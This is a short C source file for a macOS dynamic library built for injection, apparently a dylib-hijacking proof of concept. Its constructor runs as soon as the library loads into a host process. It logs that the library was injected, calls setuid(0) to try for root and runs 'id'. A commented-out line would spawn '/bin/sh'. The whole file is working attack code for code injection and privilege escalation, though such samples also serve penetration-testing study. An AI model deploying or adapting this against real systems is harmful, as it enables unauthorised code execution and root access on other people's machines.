// clang -dynamiclib m.c -o m.dylib //-o $PWD/TARGET_DYLIB
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] m.dylib injected in %s\n", argv[0]);
    printf("[+] m.dylib injected in %s\n", argv[0]);
    setuid(0);
    system("id");
    //system("/bin/sh");
}

void callLib1Function(void){}